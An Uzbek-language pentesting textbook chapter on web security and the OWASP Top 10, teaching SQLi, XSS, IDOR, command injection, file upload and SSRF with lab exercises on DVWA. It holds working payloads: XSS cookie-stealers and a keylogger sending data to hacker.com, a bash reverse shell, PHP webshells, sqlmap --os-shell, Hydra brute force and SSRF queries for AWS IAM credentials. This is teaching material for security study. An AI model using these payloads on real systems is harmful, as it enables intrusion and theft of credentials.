# 📘 5-BOB: WEB XAVFSIZLIGI (OWASP TOP 10)

---

## 5.1 Web xavfsizligi nima?

Web xavfsizligi — veb saytlar, veb ilovalar va API larni hujumlardan himoya qilish.

**Nima uchun muhim?**
- 🌍 Dunyodagi hujumlarning 43%+ web ilovalariga qaratilgan
- 💰 Bug bounty dasturlarida web zaifliklar eng ko'p topiladi
- 🔓 Aksariyat kompaniyalar web app ishlatadi

**Kerakli toollar:**
```bash
# Burp Suite (allaqachon Kali da bor)
burpsuite

# OWASP ZAP
sudo apt install zaproxy

# Nikto — web scanner
sudo apt install nikto

# Gobuster — directory brute force
sudo apt install gobuster

# SQLMap — SQL injection avtomatlash
sudo apt install sqlmap

# Wfuzz — web fuzzer
sudo apt install wfuzz
```

---

## 5.2 HTTP ni tushunish

Web hujumlarni o'rganishdan oldin HTTP ni yaxshi bilish kerak.

### HTTP So'rov (Request)
```
GET /login.php?user=admin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Accept: text/html
Connection: keep-alive
```

### HTTP Javob (Response)
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly; Secure
Server: Apache/2.4.41

<html>
  <body>Xush kelibsiz!</body>
</html>
```

### HTTP Metodlari
| Metod | Vazifasi | Xavf |
|-------|---------|------|
| **GET** | Ma'lumot olish | URL da ko'rinadi |
| **POST** | Ma'lumot yuborish | Body da yashirilgan |
| **PUT** | Yangilash | Fayl yuklash xavfi |
| **DELETE** | O'chirish | Ruxsatsiz o'chirish |
| **PATCH** | Qisman yangilash | |
| **OPTIONS** | Metodlarni ko'rish | Ma'lumot beradi |
| **HEAD** | Faqat header | |

### HTTP Status kodlari
```
200 OK              — Muvaffaqiyat
201 Created         — Yaratildi
301 Moved           — Doimiy yo'naltirish
302 Found           — Vaqtincha yo'naltirish
400 Bad Request     — Noto'g'ri so'rov
401 Unauthorized    — Login kerak
403 Forbidden       — Ruxsat yo'q
404 Not Found       — Topilmadi
405 Method Not Allowed
500 Internal Error  — Server xatosi (qimmatli!)
503 Service Unavailable
```

---

## 5.3 Burp Suite — Asosiy tool

Burp Suite — web pentestning eng muhim qurol. HTTP so'rovlarni ushlab, o'zgartirib yuborishga imkon beradi.

### O'rnatish va sozlash:
```
1. burpsuite → ishga tushiring
2. "Temporary project" → Next → "Use Burp defaults" → Start Burp
3. Proxy → Options → 127.0.0.1:8080 (default)
4. Firefox → Settings → Network → Manual Proxy:
   HTTP Proxy: 127.0.0.1   Port: 8080
5. Burp → Proxy → Intercept → "Intercept is on"
6. Firefox da biror saytga kiring → Burp ushlab oladi!
```

### Asosiy modullar:

**Proxy** — Trafikni ushlab o'zgartirish
```
1. Intercept yoqing
2. Saytga so'rov yuboring
3. So'rovni ko'ring va "Forward" bosing
4. Yoki "Action → Send to Repeater" bilan takrorlash
```

**Repeater** — So'rovni qayta-qayta yuborish
```
1. So'rovni Repeater ga yuboring
2. Parametrlarni o'zgartiring
3. "Send" bosing va javobni ko'ring
4. SQLi, XSS test qilish uchun ideal
```

**Intruder** — Avtomatik brute force
```
1. So'rovni Intruder ga yuboring
2. §parol§ — attack pozitsiyasini belgilang
3. Wordlist yuklang
4. Start Attack
```

**Scanner** — Zaifliklarni avtomatik topish (Pro versiya)

---

## 5.4 OWASP Top 10 — 2021

OWASP (Open Web Application Security Project) — eng keng tarqalgan 10 ta web zaiflik ro'yxati.

```
A01 - Broken Access Control        ← #1 ga chiqdi!
A02 - Cryptographic Failures
A03 - Injection (SQLi, XSS...)
A04 - Insecure Design
A05 - Security Misconfiguration
A06 - Vulnerable Components
A07 - Authentication Failures
A08 - Software Integrity Failures
A09 - Logging Failures
A10 - Server-Side Request Forgery
```

---

## 5.5 A01 — SQL Injection (SQLi)

SQL Injection — web forma orqali ma'lumotlar bazasiga zararli SQL kodi kiritish.

### Qanday ishlaydi?

Zaif kod (PHP):
```php
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
```

Normal so'rov:
```
user=admin
SQL: SELECT * FROM users WHERE username = 'admin'
```

Hujum so'rovi:
```
user=admin' OR '1'='1
SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
     ↑ Bu DOIM true! Barcha foydalanuvchilar qaytadi
```

### SQLi turlari:

**1. Classic (Error-based) SQLi**
```sql
-- Login bypass
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x

-- Ma'lumot olish
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

**2. Blind SQLi (javob ko'rinmaydi)**
```sql
-- Boolean-based
' AND 1=1--     (true = normal javob)
' AND 1=2--     (false = boshqa javob)
' AND (SELECT COUNT(*) FROM users)>0--

-- Time-based
' AND SLEEP(5)--          (MySQL)
' AND pg_sleep(5)--       (PostgreSQL)
' WAITFOR DELAY '0:0:5'-- (MSSQL)
```

**3. Error-based SQLi**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
```

### SQLMap — Avtomatik SQLi

```bash
# Asosiy skan
sqlmap -u "http://example.com/page.php?id=1"

# POST so'rov
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=1234"

# Cookie bilan
sqlmap -u "http://example.com/profile.php" --cookie="session=abc123"

# Ma'lumotlar bazasini topish
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Jadvallarni topish
sqlmap -u "http://example.com/page.php?id=1" -D ma_lumotlar_bazasi --tables

# Ustunlarni topish
sqlmap -u "http://example.com/page.php?id=1" -D db_nomi -T users --columns

# Ma'lumotlarni olish
sqlmap -u "http://example.com/page.php?id=1" -D db_nomi -T users --dump

# OS shell olishga harakat
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# Burp dan so'rovni saqlash va ishlatish
# Burp → Right click → Save item → req.txt
sqlmap -r req.txt --dbs
```

### Himoya:
```php
// Xavfsiz kod — Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

---

## 5.6 A03 — XSS (Cross-Site Scripting)

XSS — saytga zararli JavaScript kod kiritish. Natijada boshqa foydalanuvchilarning brauzerida ishga tushadi.

### XSS turlari:

**1. Reflected XSS** (eng keng tarqalgan)
```
URL: http://example.com/search?q=<script>alert('XSS')</script>
Sayt javob: Qidiruv: <script>alert('XSS')</script>
```

**2. Stored XSS** (eng xavfli)
```
Comment maydoniga yozing:
<script>document.location='http://hacker.com/?c='+document.cookie</script>

↑ Bu izoh bazaga saqlanadi, har kim ko'rganda ishga tushadi!
```

**3. DOM-based XSS**
```javascript
// Zaif kod:
document.getElementById('output').innerHTML = location.hash.substring(1);

// Hujum URL:
http://example.com/#<img src=x onerror=alert('XSS')>
```

### XSS payloadlari:

```html
<!-- Oddiy test -->
<script>alert('XSS')</script>

<!-- Cookie o'g'irlash -->
<script>document.location='http://hacker.com/?c='+document.cookie</script>

<!-- img orqali -->
<img src=x onerror=alert('XSS')>
<img src=x onerror="document.location='http://hacker.com/?c='+document.cookie">

<!-- svg orqali -->
<svg onload=alert('XSS')>

<!-- Filter bypass -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
"><script>alert('XSS')</script>
';alert('XSS');//

<!-- Keylogger -->
<script>
document.onkeypress = function(e) {
  new Image().src = "http://hacker.com/log?k=" + e.key;
}
</script>
```

### Cookie o'g'irlash amaliyoti:
```bash
# 1. O'z serveringizda listener yoqing
nc -lvp 8080

# 2. XSS payload:
<script>fetch('http://YOUR_IP:8080/?cookie='+btoa(document.cookie))</script>

# 3. Cookie base64 decode qiling
echo "dXNlcj1hZG1pbg==" | base64 -d
```

### Himoya:
```php
// PHP
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// JavaScript
element.textContent = userInput;  // innerHTML emas!
```

---

## 5.7 A01 — Broken Access Control

Foydalanuvchi o'z huquqidan oshib ketishi.

### IDOR (Insecure Direct Object Reference)

```
# Sizning profilingiz:
GET /profile?id=1001

# Boshqa profil (raqamni o'zgartiring):
GET /profile?id=1002  ← Agar ko'rsangiz — IDOR zaiflik!
GET /profile?id=1     ← Admin bo'lishi mumkin!

# Buyurtmalar:
GET /order/12345       ← O'zingizniki
GET /order/12344       ← Boshqaning buyurtmasi?

# Fayllar:
GET /download?file=invoice_1001.pdf
GET /download?file=invoice_1000.pdf  ← IDOR!
```

### Horizontal vs Vertical Privilege Escalation

```
Horizontal: Bir xil darajadagi boshqa user ma'lumotiga kirish
  /api/user/123  →  /api/user/124

Vertical: Yuqori darajaga ko'tarilish
  /user/profile  →  /admin/panel
```

### Path Traversal
```
# Oddiy so'rov:
GET /download?file=report.pdf

# Hujum — tizim fayllariga kirish:
GET /download?file=../../../../etc/passwd
GET /download?file=../../../windows/system32/drivers/etc/hosts

# Encoded:
GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
GET /download?file=..%252f..%252fetc%252fpasswd
```

---

## 5.8 A07 — Authentication Failures

### Brute Force hujumi

```bash
# Hydra bilan web form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "example.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P wordlist.txt http-get://example.com/admin

# SSH brute force
hydra -l root -P wordlist.txt ssh://192.168.1.1

# FTP brute force
hydra -l ftp -P wordlist.txt ftp://192.168.1.1
```

### Default parollar

Ko'p qurilmalar default parol bilan keladi:

| Qurilma | Username | Password |
|---------|----------|---------|
| Router | admin | admin |
| Router | admin | password |
| Router | admin | 1234 |
| phpMyAdmin | root | (bo'sh) |
| Jenkins | admin | admin |
| Tomcat | admin | tomcat |
| WordPress | admin | admin |

```bash
# Default parollarni tekshirish
nmap --script http-default-accounts -p 80 192.168.1.1
```

### JWT Token zaifliklar

JWT (JSON Web Token) format:
```
header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.XXXX
```

```bash
# JWT decode (base64)
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d
# {"user":"admin"}

# JWT zaiflik 1: alg=none
# Header ni o'zgartiring:
{"alg":"none"}  →  eyJhbGciOiJub25lIn0=
# Signature ni o'chiring va yuboring

# JWT zaiflik 2: Kuchsiz secret
# jwt_tool bilan
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# JWT zaiflik 3: RS256 → HS256 o'zgartirish
```

---

## 5.9 A05 — Security Misconfiguration

### Directory Listing
```
# Agar sayt papka tarkibini ko'rsatsa:
http://example.com/backup/
http://example.com/uploads/
http://example.com/admin/
```

### Gobuster — Yashirin sahifalarni topish

```bash
# Asosiy directory brute force
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# Kengaytma bilan
gobuster dir -u http://example.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old

# Subdomain topish
gobuster dns -d example.com -w /usr/share/wordlists/subdomains.txt

# Virtual host topish
gobuster vhost -u http://example.com -w /usr/share/wordlists/subdomains.txt
```

### Nikto — Web scanner

```bash
# Asosiy skan
nikto -h http://example.com

# HTTPS
nikto -h https://example.com -ssl

# Natijani saqlash
nikto -h http://example.com -o natija.txt
```

### Muhim yashirin fayllar

```bash
# Robots.txt — yashirin sahifalar ro'yxati
curl http://example.com/robots.txt

# Sitemap
curl http://example.com/sitemap.xml

# .git papkasi (kod chiqib qolgan!)
curl http://example.com/.git/HEAD
git-dumper http://example.com/.git/ ./chiqarilgan_kod

# Zaxira fayllar
curl http://example.com/backup.zip
curl http://example.com/db.sql
curl http://example.com/config.php.bak
curl http://example.com/.env          # Environment o'zgaruvchilar!

# Admin panellar
curl http://example.com/admin
curl http://example.com/administrator
curl http://example.com/wp-admin      # WordPress
curl http://example.com/phpmyadmin
```

---

## 5.10 A03 — Command Injection

Web forma orqali server da Linux buyruqlarini ishga tushirish.

```php
// Zaif PHP kodi:
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
```

```bash
# Normal so'rov:
?ip=127.0.0.1
# Ishga tushadigan: ping -c 1 127.0.0.1

# Hujum:
?ip=127.0.0.1; whoami
# Ishga tushadigan: ping -c 1 127.0.0.1; whoami

?ip=127.0.0.1 && cat /etc/passwd
?ip=127.0.0.1 | id
?ip=`id`
?ip=$(id)

# Reverse shell olish:
?ip=127.0.0.1; bash -i >& /dev/tcp/HACKER_IP/4444 0>&1
```

---

## 5.11 File Upload zaiflik

```bash
# 1. PHP shell fayl yaratish
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Saytga yuklash (agar ruxsat bor bo'lsa)
# shell.php → rasm.php.jpg (filter bypass)
# shell.php → shell.pHp (katta-kichik harf)
# Content-Type: image/jpeg deb yuborish (Burp bilan)

# 3. Shell ni ishga tushirish
curl "http://example.com/uploads/shell.php?cmd=id"
curl "http://example.com/uploads/shell.php?cmd=cat+/etc/passwd"

# 4. Reverse shell
curl "http://example.com/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/IP/4444+0>%261"
```

### Webshell turlari:
```php
<!-- Oddiy -->
<?php system($_GET['cmd']); ?>

<!-- Ko'proq imkoniyat -->
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

<!-- b374k, c99, r57 — mashhur webshell lar (faqat ruxsatli tizimda!) -->
```

---

## 5.12 SSRF — Server Side Request Forgery

Server orqali ichki tarmoqqa so'rov yuborish.

```bash
# Zaif parametr:
?url=https://example.com/image.jpg

# SSRF hujum:
?url=http://127.0.0.1/admin          # Lokal admin paneli
?url=http://192.168.1.1              # Ichki tarmoq
?url=http://169.254.169.254/         # AWS metadata!
?url=file:///etc/passwd              # Lokal fayl o'qish
?url=dict://127.0.0.1:3306           # MySQL ga so'rov

# AWS metadata (cloud serverlarda qimmatli):
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 5.13 Amaliy muhit — DVWA va WebGoat

Mashq qilish uchun ataylab zaif saytlar:

```bash
# DVWA (Damn Vulnerable Web Application) o'rnatish
sudo apt install dvwa
# yoki Docker:
docker run -d -p 80:80 vulnerables/web-dvwa

# WebGoat (OWASP)
docker run -p 8080:8080 webgoat/goat-and-wolf

# Metasploitable (to'liq zaif VM)
# VulnHub dan yuklab oling: Metasploitable2

# DVWA ga kirish:
# http://localhost/dvwa
# admin / password
# Security Level: Low (boshlash uchun)
```

---

## 5.14 Amaliy: To'liq web pentest jarayoni

```bash
# 1. RECON — Ma'lumot to'plash
whois example.com
dig example.com ANY
nmap -sC -sV -p 80,443,8080,8443 example.com

# 2. SCANNING — Zaiflik qidirish
nikto -h http://example.com
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# 3. ENUMERATION — Batafsil o'rganish
# robots.txt, sitemap.xml, .git, .env ko'rish
# Burp ile barcha parametrlarni to'plash

# 4. EXPLOITATION — Zaifliklarni ishlatish
# SQLi: sqlmap -u "URL" --dbs
# XSS: payload yuborish, cookie o'g'irlash
# Auth: default parollar, brute force

# 5. REPORTING — Hisobot yozish
# - Topilgan zaiflik nomi
# - Joylashuvi (URL, parametr)
# - Xavflilik darajasi (Critical/High/Medium/Low)
# - PoC (Proof of Concept)
# - Himoya tavsiyasi
```

---

## 5.15 Bob yakunida bilishingiz kerak

✅ HTTP so'rov/javob tuzilmasini tushunish  
✅ Burp Suite bilan trafikni ushlab o'zgartirish  
✅ SQL Injection — qo'lda va sqlmap bilan  
✅ XSS — Reflected, Stored, DOM turlari  
✅ IDOR — raqamlarni o'zgartirish  
✅ Brute force — Hydra bilan  
✅ Directory enumeration — Gobuster bilan  
✅ Command injection asoslari  
✅ File upload zaiflik  

---

## 📝 Amaliy topshiriq #5

```bash
# 1. DVWA o'rnating va quyidagilarni bajaring:
#    - SQL Injection (Low) → admin parolni toping
#    - XSS (Reflected) → alert() chiqaring
#    - File Upload → PHP shell yuklang
#    - Command Injection → /etc/passwd o'qing

# 2. PortSwigger Web Academy (bepul!):
#    https://portswigger.net/web-security
#    - SQL injection labs (hammasini bajaring)
#    - XSS labs (hammasini bajaring)

# 3. Gobuster bilan DVWA ni skanlang:
gobuster dir -u http://localhost/dvwa \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak

# 4. SQLMap bilan DVWA SQLi topish:
# Avval Burp bilan so'rovni ushlang, req.txt ga saqlang
sqlmap -r req.txt --dbs --cookie="PHPSESSID=xxx; security=low"
```

---

*Keyingi bob → 💀 Penetration Testing va Toollar*
